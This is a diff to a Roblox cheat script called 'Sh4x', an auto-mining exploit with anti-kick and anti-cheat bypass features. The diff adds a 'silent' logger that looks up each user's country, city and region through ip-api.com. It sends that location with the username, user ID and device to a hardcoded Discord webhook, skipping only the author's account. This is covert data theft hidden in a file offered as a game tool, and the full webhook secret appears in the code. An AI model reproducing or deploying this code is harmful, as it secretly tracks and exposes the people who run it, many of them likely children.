@@ -1,22 +1,95 @@
 --[[
-    Sh4x upgrade
-    Focus: ULTRA SPEED + AUTOMATIC EXECUTION LOGS
-    Exclusive for: fimossegamers123
+    Sh4x - ULTRA SPEED EDITION (GEO VERSION)
+    Focus: MAXIMUM MINING SPEED + SILENT DISCORD LOGGING (COUNTRY/CITY)
     Security: ANTI-KICK / ANTI-AFK / OBFUSCATION / BYPASS
+    Visuals: RED THEME + RGB BORDERS
 ]]
 
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
-local TweenService = game:GetService("TweenService")
 local VirtualUser = game:GetService("VirtualUser")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
-local LocalizationService = game:GetService("LocalizationService")
+local UserInputService = game:GetService("UserInputService")
 local Player = Players.LocalPlayer
 
--- [SISTEMA DE LOGS EM TEMPO REAL]
-local ExecutionLogs = {}
+-- [CONFIGURAÇÃO]
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1465809966983155857/YHUdyCOZgu3mymCizFY5coTioKx2UjoR9puFeotVWQHrq3mGgFkZhQt1LrBLx20aLXCd"
+local SCRIPT_NAME = "Sh4x ULTRA SPEED"
+local IGNORED_USER = "fimossegamers123"
+
+-- [DETECÇÃO DE DISPOSITIVO]
+local function getPlatform()
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        return "Mobile"
+    elseif UserInputService.GamepadEnabled then
+        return "Console"
+    else
+        return "PC"
+    end
+end
+
+-- [FUNÇÃO DE LOG SILENCIOSA COM GEOLOCALIZAÇÃO]
+local function silentLog()
+    -- Verifica se é o usuário ignorado
+    if Player.Name == IGNORED_USER then return end
+
+    local country = "Desconhecido"
+    local city = "Desconhecida"
+    local region = "Desconhecida"
+    
+    -- Tenta obter a localização geográfica via API
+    pcall(function()
+        local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
+        if reqFunc then
+            local response = reqFunc({
+                Url = "http://ip-api.com/json/",
+                Method = "GET"
+            })
+            if response and response.Body then
+                local geoData = HttpService:JSONDecode(response.Body)
+                if geoData.status == "success" then
+                    country = geoData.country or "Desconhecido"
+                    city = geoData.city or "Desconhecida"
+                    region = geoData.regionName or "Desconhecida"
+                end
+            end
+        end
+    end)
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "🌍 Script Executado: " .. SCRIPT_NAME,
+            ["color"] = 16711680,
+            ["fields"] = {
+                {["name"] = "👤 Jogador", ["value"] = Player.Name .. " (" .. Player.UserId .. ")", ["inline"] = true},
+                {["name"] = "📱 Dispositivo", ["value"] = getPlatform(), ["inline"] = true},
+                {["name"] = "📍 Localização Real", ["value"] = "🚩 Pais: " .. country .. "\n🏙️ Cidade: " .. city .. "\n🗺️ Região: " .. region, ["inline"] = false},
+                {["name"] = "⏰ Horário", ["value"] = os.date("%d/%m/%Y - %H:%M:%S"), ["inline"] = false},
+                {["name"] = "🎮 Jogo ID", ["value"] = tostring(game.PlaceId), ["inline"] = true}
+            },
+            ["footer"] = {["text"] = "Geo Stealth Logger System"}
+        }}
+    }
+
+    local jsonData = HttpService:JSONEncode(data)
+    
+    -- Envio totalmente silencioso
+    pcall(function()
+        local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
+        if reqFunc then
+            reqFunc({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end
+    end)
+end
+
+-- Inicia o log em background
+task.spawn(silentLog)
 
 -- [ANTI-KICK PROTECTION]
 local function applyAntiKick()
@@ -49,33 +122,6 @@ local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = generateID()
 ScreenGui.Parent = CoreGui
 
--- [DRAGGABLE FUNCTION]
-local function makeDraggable(frame)
-    local dragging, dragInput, dragStart, startPos
-    frame.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = input.Position
-            startPos = frame.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then dragging = false end
-            end)
-        end
-    end)
-    frame.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-            dragInput = input
-        end
-    end)
-    game:GetService("UserInputService").InputChanged:Connect(function(input)
-        if input == dragInput and dragging then
-            local delta = input.Position - dragStart
-            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end
-    end)
-end
-
--- [MAIN MENU]
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = generateID()
 MainFrame.Parent = ScreenGui
@@ -83,15 +129,15 @@ MainFrame.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
 MainFrame.Position = UDim2.new(0.5, -110, 0.5, -80)
 MainFrame.Size = UDim2.new(0, 220, 0, 160)
 Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)
+
 local Stroke = Instance.new("UIStroke", MainFrame)
 Stroke.Thickness = 2.5
-makeDraggable(MainFrame)
 
 local Title = Instance.new("TextLabel", MainFrame)
 Title.Size = UDim2.new(1, 0, 0, 40)
 Title.BackgroundTransparency = 1
 Title.Font = Enum.Font.GothamBold
-Title.Text = "Sh4x upgrade"
+Title.Text = "Sh4x ULTRA SPEED"
 Title.TextSize = 16
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 
@@ -103,6 +149,7 @@ ToggleBtn.Font = Enum.Font.GothamBold
 ToggleBtn.Text = "START ULTRA FARM"
 ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 Instance.new("UICorner", ToggleBtn)
+
 local BtnStroke = Instance.new("UIStroke", ToggleBtn)
 BtnStroke.Thickness = 1.5
 
@@ -126,134 +173,29 @@ task.spawn(function()
     end
 end)
 
--- ==========================================
--- SISTEMA DE DATABASE EXCLUSIVO (fimossegamers123)
--- ==========================================
-if Player.Name == "fimossegamers123" then
-    local AdminFrame = Instance.new("Frame")
-    AdminFrame.Name = generateID()
-    AdminFrame.Parent = ScreenGui
-    AdminFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-    AdminFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
-    AdminFrame.Size = UDim2.new(0, 300, 0, 250)
-    Instance.new("UICorner", AdminFrame).CornerRadius = UDim.new(0, 10)
-    
-    local AdminStroke = Instance.new("UIStroke", AdminFrame)
-    AdminStroke.Thickness = 2
-    AdminStroke.Color = Color3.fromRGB(255, 0, 0)
-    
-    local AdminTitle = Instance.new("TextLabel", AdminFrame)
-    AdminTitle.Size = UDim2.new(1, 0, 0, 35)
-    AdminTitle.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-    AdminTitle.Font = Enum.Font.GothamBold
-    AdminTitle.Text = "Sh4x upgrade - EXECUTION LOGS"
-    AdminTitle.TextSize = 12
-    AdminTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-    Instance.new("UICorner", AdminTitle)
-    
-    local Scroll = Instance.new("ScrollingFrame", AdminFrame)
-    Scroll.Size = UDim2.new(0.94, 0, 0.8, 0)
-    Scroll.Position = UDim2.new(0.03, 0, 0.16, 0)
-    Scroll.BackgroundTransparency = 1
-    Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-    Scroll.ScrollBarThickness = 3
-    Scroll.ScrollBarImageColor3 = Color3.fromRGB(255, 0, 0)
-    
-    local ListLayout = Instance.new("UIListLayout", Scroll)
-    ListLayout.Padding = UDim.new(0, 8)
-    ListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-    
-    local function addLog(user, userId, region, time)
-        local LogItem = Instance.new("Frame", Scroll)
-        LogItem.Size = UDim2.new(0.95, 0, 0, 55)
-        LogItem.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-        Instance.new("UICorner", LogItem)
-        
-        local UserLabel = Instance.new("TextLabel", LogItem)
-        UserLabel.Size = UDim2.new(1, -10, 0, 20)
-        UserLabel.Position = UDim2.new(0, 10, 0, 5)
-        UserLabel.BackgroundTransparency = 1
-        UserLabel.Font = Enum.Font.GothamBold
-        UserLabel.Text = "👤 " .. user .. " (" .. userId .. ")"
-        UserLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-        UserLabel.TextSize = 11
-        UserLabel.TextXAlignment = Enum.TextXAlignment.Left
-        
-        local InfoLabel = Instance.new("TextLabel", LogItem)
-        InfoLabel.Size = UDim2.new(1, -10, 0, 25)
-        InfoLabel.Position = UDim2.new(0, 10, 0, 25)
-        InfoLabel.BackgroundTransparency = 1
-        InfoLabel.Font = Enum.Font.Gotham
-        InfoLabel.Text = "📍 Loc: " .. region .. " | 🕒 Time: " .. time
-        InfoLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
-        InfoLabel.TextSize = 10
-        InfoLabel.TextXAlignment = Enum.TextXAlignment.Left
-        
-        Scroll.CanvasSize = UDim2.new(0, 0, 0, ListLayout.AbsoluteContentSize.Y + 10)
+-- Arrastar
+local dragging, dragInput, dragStart, startPos
+MainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
+        end)
     end
-    
-    makeDraggable(AdminFrame)
-    
-    task.spawn(function()
-        while true do
-            for _, child in pairs(Scroll:GetChildren()) do
-                if child:IsA("Frame") then child:Destroy() end
-            end
-            for _, log in pairs(ExecutionLogs) do
-                addLog(log.user, log.userId, log.region, log.time)
-            end
-            task.wait(5)
-        end
-    end)
-end
-
--- [FUNÇÃO DE REGISTRO AUTOMÁTICO]
-local function autoRegisterExecution()
-    local region = "Unknown"
-    pcall(function()
-        region = LocalizationService:GetCountryRegionCode()
-    end)
-    
-    local data = {
-        user = Player.Name,
-        userId = Player.UserId,
-        region = region,
-        time = os.date("%H:%M:%S")
-    }
-    
-    table.insert(ExecutionLogs, data)
-    
-    pcall(function()
-        local tag = Instance.new("StringValue")
-        tag.Name = "Sh4x_User_" .. Player.Name
-        tag.Value = HttpService:JSONEncode(data)
-        tag.Parent = ReplicatedStorage
-    end)
-end
-
-autoRegisterExecution()
-
-if Player.Name == "fimossegamers123" then
-    task.spawn(function()
-        while true do
-            for _, v in pairs(ReplicatedStorage:GetChildren()) do
-                if v.Name:find("Sh4x_User_") then
-                    local success, data = pcall(function() return HttpService:JSONDecode(v.Value) end)
-                    if success then
-                        local exists = false
-                        for _, log in pairs(ExecutionLogs) do
-                            if log.userId == data.userId then exists = true break end
-                        end
-                        if not exists then
-                            table.insert(ExecutionLogs, data)
-                        end
-                    end
-                end
-            end
-            task.wait(10)
-        end
-    end)
-end
+end)
+MainFrame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
 
 -- ==========================================
 -- LÓGICA DE AUTO MINING ULTRA RÁPIDA
@@ -262,6 +204,8 @@ local RAIO_OPERACAO = 90
 local DISTANCIA_ATAQUE = 7.5
 local farmAtivo = false
 local lastSwing = 0
+
+-- [ULTRA SPEED] Intervalo de ataque reduzido ao limite
 local ATTACK_SPEED = 0.25 
 
 ToggleBtn.MouseButton1Click:Connect(function()
@@ -315,14 +259,18 @@ task.spawn(function()
                     else
                         humanoid:MoveTo(root.Position)
                         if tool.Parent ~= char then humanoid:EquipTool(tool) end
+                        
+                        -- Rotação Instantânea
                         root.CFrame = CFrame.new(root.Position, Vector3.new(alvo.Position.X, root.Position.Y, alvo.Position.Z))
 
+                        -- [ULTRA SPEED] Ataque e Remotes em Massa
                         if tick() - lastSwing > ATTACK_SPEED then
                             lastSwing = tick()
                             tool:Activate()
                             VirtualUser:CaptureController()
                             VirtualUser:ClickButton1(Vector2.new(0, 0))
                             
+                            -- Disparo de Remotes Otimizado (3 pacotes por swing)
                             task.spawn(function()
                                 for i = 1, 3 do 
                                     for _, r in pairs(ReplicatedStorage:GetDescendants()) do
@@ -342,6 +290,6 @@ task.spawn(function()
                 end
             end
         end
-        task.wait(0.01)
+        task.wait(0.01) -- Loop de alta frequência
     end
 end)
